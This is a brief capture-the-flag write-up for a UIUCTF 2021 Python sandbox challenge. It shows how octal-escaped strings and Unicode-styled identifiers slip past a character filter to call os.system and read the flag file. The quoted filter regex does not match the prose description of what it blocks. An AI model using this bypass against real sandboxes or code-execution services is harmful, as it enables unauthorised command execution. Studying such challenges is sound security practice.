---
layout: post
title:  "Baby python fixed - Sandbox (UIUCTF 2021)"
date:   2021-08-09
categories: writeups
author: Joey Geralnik
tags: python, sandbox
---
In this challenge we run python code inside a sandbox and must avoid lowercase letters:

```python
import re
bad = bool(re.search(r'[^a-z\s]', (input := input())))
exec(input) if not bad else print('Input contained bad characters')
exit(bad)
```

We can easily create strings by writing their values is octal, so `'os'` becomes `'\157\163'` and `'cat /flag'` becomes `'\143\141\164\040\057\146\154\141\147'`

A quick script for conversions:

```python
def octalize(s):
    print('\\' + '\\'.join(oct(ord(i))[2:].zfill(3) for i in s))
```

The harder part is doing something interesting with these strings. 
It turns out that python will run unicode italics and bold (WTF?!?!). So we can run:

```python
__𝒾𝓂𝓅𝑜𝓇𝓉__('\157\163').𝙨𝙮𝙨𝙩𝙚𝙢('\143\141\164\040\057\146\154\141\147')
```

to obtain the flag.
